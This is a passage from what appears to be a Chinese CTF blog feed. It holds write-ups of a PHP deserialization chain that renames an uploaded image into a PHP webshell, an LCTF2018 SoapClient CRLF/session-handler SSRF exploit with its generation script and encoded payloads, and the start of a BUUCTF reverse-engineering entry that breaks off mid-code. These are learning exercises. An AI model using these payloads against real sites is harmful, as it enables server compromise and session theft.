<span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">except</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token variable">$name</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token variable">$name</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Register</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$registed</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">registed</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">except</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token single-quoted-string string">'index'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">img</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"upload_img"</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ext</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"png"</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename_tmp</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"./upload/c41893938531041badacfc22febe3abd/00bf23e130fa1e525e332ff03dae345d.png"</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"./upload/c41893938531041badacfc22febe3abd/00bf23e130fa1e525e332ff03dae345d.php"</span><span class="token punctuation">;</span><span class="token variable">$register</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$register</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">registed</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$register</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$register</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得下面的payload<br><pre class="line-numbers language-none"><code class="language-none">TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO047czoxMjoiZmlsZW5hbWVfdG1wIjtzOjc4OiIuL3VwbG9hZC9jNDE4OTM5Mzg1MzEwNDFiYWRhY2ZjMjJmZWJlM2FiZC8wMGJmMjNlMTMwZmExZTUyNWUzMzJmZjAzZGFlMzQ1ZC5wbmciO3M6ODoiZmlsZW5hbWUiO3M6Nzg6Ii4vdXBsb2FkL2M0MTg5MzkzODUzMTA0MWJhZGFjZmMyMmZlYmUzYWJkLzAwYmYyM2UxMzBmYTFlNTI1ZTMzMmZmMDNkYWUzNDVkLnBocCI7czoxMToidXBsb2FkX21lbnUiO047czozOiJleHQiO3M6MzoicG5nIjtzOjM6ImltZyI7czoxMDoidXBsb2FkX2ltZyI7czo2OiJleGNlcHQiO2E6MTp7czo1OiJpbmRleCI7czozOiJpbWciO319czo4OiJyZWdpc3RlZCI7YjowO30%3D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><img src="/2020/11/15/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/4.png" alt><br><img src="/2020/11/15/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/5.png" alt><br>图片马上传很简单嘛。</p><p>然后连蚁剑，get flag。<br><img src="/2020/11/15/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/6.png" alt><br><code>flag&#123;ce475263-8092-4e0d-952e-e08ae5484897&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bestphp_s_revenge</title>
      <link href="2020/11/14/bestphp-s-revenge/"/>
      <url>2020/11/14/bestphp-s-revenge/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>我的萤火之光但愿也能照亮你前行的路。</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=1471121498&auto=1&height=66"></iframe><p>看的是王叹之师傅写的博文复现的，师傅太强了，学习学习。<br><strong>这里我也先列知识点了</strong></p><h2 id="1-知识点"><a href="#1-知识点" class="headerlink" title="1.知识点"></a>1.知识点</h2><h3 id="0x0A-PHP反序列化过程中魔术方法执行时间"><a href="#0x0A-PHP反序列化过程中魔术方法执行时间" class="headerlink" title="0x0A.PHP反序列化过程中魔术方法执行时间"></a>0x0A.PHP反序列化过程中魔术方法执行时间</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//使用unserialize时触发</span><span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//使用serialize时触发</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//对象被销毁时触发</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//在对象上下文中调用不可访问的方法时触发</span><span class="token function">__callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//在静态上下文中调用不可访问的方法时触发</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//用于从不可访问的属性读取数据</span><span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//用于将数据写入不可访问的属性</span><span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//在不可访问的属性上调用isset()或empty()触发</span><span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//在不可访问的属性上使用unset()时触发</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//把类当作字符串使用时触发</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//当脚本尝试将对象调用为函数时触发</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x0B-PHP内置类SoapClient"><a href="#0x0B-PHP内置类SoapClient" class="headerlink" title="0x0B.PHP内置类SoapClient"></a>0x0B.PHP内置类SoapClient</h3><blockquote><p>SOAP是什么:<code>SOAP</code>是基于<code>XML</code>的简易协议，可使应用程序在<code>HTTP</code>之上进行信息交换。或者更简单地说：<code>SOAP</code>是用于访问网络服务的协议。</p></blockquote><p>PHP中SOAP的简单的用法如下<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span>location<span class="token single-quoted-string string">'=>'</span>http<span class="token punctuation">:</span><span class="token comment">//example.com:2333','uri'=>'123'));</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="0x0C-CRLF-Injection漏洞"><a href="#0x0C-CRLF-Injection漏洞" class="headerlink" title="0x0C.CRLF Injection漏洞"></a>0x0C.<code>CRLF Injection</code>漏洞</h3><p><a href="https://www.jianshu.com/p/d4c304dbd0af">参考这篇文章</a></p><p>CRLF是<code>回车+换行</code>（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用<code>两个CRLF分隔</code>的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能<code>注入一些会话Cookie或者HTML代码</code>，所以<code>CRLFInjection</code>又叫<code>HTTPResponseSplitting</code>，简称HRS。</p><p>下面请看他的实验<br><img src="/2020/11/14/bestphp-s-revenge/1.png" alt></p><h3 id="0x0D-serialize-hander处理session方式不同导致session注入"><a href="#0x0D-serialize-hander处理session方式不同导致session注入" class="headerlink" title="0x0D.serialize_hander处理session方式不同导致session注入"></a>0x0D.serialize_hander处理session方式不同导致session注入</h3><p><strong>主要的知识点就是下面的内容</strong></p><p>session.serialize_handler存在以下几种<br><pre class="line-numbers language-php" data-language="php"><code class="language-php">php_binary 键名的长度对应的ascii字符<span class="token operator">+</span>键名<span class="token operator">+</span>经过<span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数序列化后的值php 键名<span class="token operator">+</span>竖线（<span class="token operator">|</span>）<span class="token operator">+</span>经过<span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数处理过的值                 <span class="token comment">//**注意这里的竖线是要利用的点*/</span>php_serialize 经过<span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数处理过的值，会将键名和值当作一个数组序列化<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>若传入<code>$_SESSION[&#39;name&#39;]=&#39;|O:5:&quot;xxxxx&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&#39;;</code><br>序列化引擎使用的是<code>php_serialize</code>，那么储存的<code>session文件</code>内容即为<br><code>a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;|O:5:&quot;xxxxx&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&quot;;&#125;</code><br>而<code>反序列化引擎</code>如果使用的是<code>php</code>，就会<code>把|作为作为key和value的分隔符</code>。把a:1:{s:4:”name”;s:5:”当作键名，而把O:5:”xxxxx”:1:{s:4:”test”;s:3:”AAA”;}当作经过serialize()函数处理过的值，最后会把它<code>O:5:&quot;xxxxx&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;</code>进行unserialize处理，此时就构成了一次<code>反序列化注入攻击</code>。</p><h2 id="2-解题"><a href="#2-解题" class="headerlink" title="2.解题"></a>2.解题</h2><p>先给出源代码<br><pre class="line-numbers language-php" data-language="php"><code class="language-php">//index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'implode'</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>f<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'welcome_to_the_lctf2018'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//flag.php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'only localhost can get flag!'</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'LCTF&#123;*************************&#125;'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>only localhost can get flag<span class="token operator">!</span>    <span class="token comment">//老ssrf了。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x0a-覆盖序列化引擎并将构造的Soap类序列化字符串写入session文件。"><a href="#0x0a-覆盖序列化引擎并将构造的Soap类序列化字符串写入session文件。" class="headerlink" title="0x0a.覆盖序列化引擎并将构造的Soap类序列化字符串写入session文件。"></a>0x0a.覆盖序列化引擎并将构造的Soap类序列化字符串写入session文件。</h3><p><strong>soap构造脚本：</strong></p><blockquote><p>注意：打开php的soap扩展<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$target</span><span class="token operator">=</span><span class="token single-quoted-string string">'http://127.0.0.1/flag.php'</span><span class="token punctuation">;</span>   <span class="token comment">//要用soap访问的文件的地址</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$target</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'user_agent'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"fvck\r\n"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"Cookie:PHPSESSID=fvck"</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'uri'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"fvck"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$se</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">"|"</span><span class="token punctuation">.</span><span class="token variable">$se</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>得到的payload为<br><pre class="line-numbers language-none"><code class="language-none">|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22fvck%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A27%3A%22fvck%0D%0ACookie%3APHPSESSID%3Dfvck%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p></blockquote><p><code>第一步:传参</code><br><pre class="line-numbers language-none"><code class="language-none">#GET?f&#x3D;session_start&amp;name&#x3D;|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22fvck%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A27%3A%22fvck%0D%0ACookie%3APHPSESSID%3Dfvck%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D#POSTserialize_handler&#x3D;php_serialize  &#x2F;&#x2F;这里设置该页面的序列化引擎<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p><img src="/2020/11/14/bestphp-s-revenge/3.png" alt></p><h3 id="0x0b-SSRF"><a href="#0x0b-SSRF" class="headerlink" title="0x0b.SSRF"></a>0x0b.SSRF</h3><p>覆盖变量b，利用call_user_func调用SoapClient类中的不存在方法，触发__call方法，执行ssrf，获得访问flag.php的PHPSESSID。<br><code>传参</code><br><pre class="line-numbers language-none"><code class="language-none">#GETf&#x3D;extract&amp;name&#x3D;SoapClient#POSTb&#x3D;call_user_func    &#x2F;&#x2F;实现变量覆盖<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p><img src="/2020/11/14/bestphp-s-revenge/4.png" alt></p><h3 id="0x0c-以我们设置的cookie为cookie访问页面得flag"><a href="#0x0c-以我们设置的cookie为cookie访问页面得flag" class="headerlink" title="0x0c.以我们设置的cookie为cookie访问页面得flag"></a>0x0c.以我们设置的cookie为cookie访问页面得flag</h3><p><code>flag&#123;d0c9ef1c-69a3-4186-beb9-d23ced03db02&#125;</code><br><img src="/2020/11/14/bestphp-s-revenge/5.png" alt></p><h4 id="末-分析上面三步"><a href="#末-分析上面三步" class="headerlink" title="末:分析上面三步"></a>末:分析上面三步</h4><p>第一步，f传的值和post的值使其使用<code>php_serialize引擎</code>。而name的值就是将我们的name值以<code>php_serialize引擎的格式存储起来</code>。</p><p>第二步，这次发的请求使用的是默认的php引擎，我们f传值和post传值来使<code>call_user_func($b, $a);</code>变成<code>call_user_func($a);</code>而<code>$a</code>为一个数组且第一个值就是我们传入的SoapClient作为类，而第二个值welcome_to_the_lctf2018为方法，很显然该类中没这个方法从而调用<code>SoapClient的__call函数发送请求、借此执行ssrf</code>。</p><p>第三步，最后就是已我们设置的cookie(即<code>Cookie:PHPSESSID=fvck</code>)去访问了，它会返回<code>$_SESSION</code>而此时我们的flag已经在里面了。</p><blockquote><p>怕突然来不及好好地爱你。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> ssrf </tag>
            
            <tag> php反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF之Reverse</title>
      <link href="2020/11/13/BUUCTF%E4%B9%8BReverse/"/>
      <url>2020/11/13/BUUCTF%E4%B9%8BReverse/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>最近学了点汇编语言程序，拿这个练练手吧</strong></p><h2 id="1-helloword"><a href="#1-helloword" class="headerlink" title="1.helloword"></a>1.helloword</h2><p>这个下载下来是apk安卓应用，直接拿androidkiller分析一下，拿到flag。<br><img src="/2020/11/13/BUUCTF%E4%B9%8BReverse/1.png" alt><br><code>flag&#123;7631a988259a00816deda84afb29430a&#125;</code></p><h2 id="2-xor"><a href="#2-xor" class="headerlink" title="2.xor"></a>2.xor</h2><p>这里直接用ida64打开，我一般先不查32或64，直接打开，遇到错误后再看，这次很幸运。然后选中<code>_main函数</code>点击<code>F5</code>查看反汇编，内容如下<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// rsi@1</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// rax@8</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [sp+2Ch] [bp-124h]@2</span>  <span class="token keyword">char</span> v7<span class="token punctuation">[</span><span class="token number">264</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [sp+40h] [bp-110h]@1</span>  __int64 v8<span class="token punctuation">;</span> <span class="token comment">// [sp+148h] [bp-8h]@1</span>  v8 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>__stack_chk_guard_ptr<span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">256</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Input your flag:\n"</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">get_line</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> <span class="token number">256LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">33</span> <span class="token punctuation">)</span>    <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">33</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    v7<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> v7<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> global<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> global<span class="token punctuation">,</span> <span class="token number">0x21uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>LABEL_13<span class="token operator">:</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Failed"</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>__stack_chk_guard_ptr<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>__stack_chk_guard_ptr <span class="token operator">==</span> v8 <span class="token punctuation">)</span>    <span class="token function">LODWORD</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v4<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>然后这里主要看字符数组v7，下面的这句很重要，可以看出v7有33位，并且加密过程为本位与前位的内容异或生成本位<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">33</span> <span class="token punctuation">)</span>    <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">33</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    v7<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> v7<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> global<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> global<span class="token punctuation">,</span> <span class="token 